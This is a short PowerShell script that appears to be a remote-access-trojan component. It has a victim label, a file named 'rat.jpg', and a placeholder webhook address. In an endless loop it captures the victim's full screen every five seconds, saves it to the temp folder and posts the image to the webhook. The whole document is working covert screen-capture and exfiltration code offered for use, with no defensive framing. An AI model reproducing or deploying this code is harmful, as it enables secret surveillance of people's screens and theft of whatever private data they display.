$webhook = "UR_WEBHOOK_URL"
$name = "test-victim"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
  $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
  $g = [System.Drawing.Graphics]::FromImage($b)
  $g.CopyFromScreen(0,0,0,0,$b.Size)
  $path = "$env:TEMP\rat.jpg"
  $b.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
  $g.Dispose(); $b.Dispose()

  $form = @{ file1 = Get-Item $path }
  Invoke-RestMethod -Uri $webhook -Method Post -Form $form
  Start-Sleep -Seconds 5
}
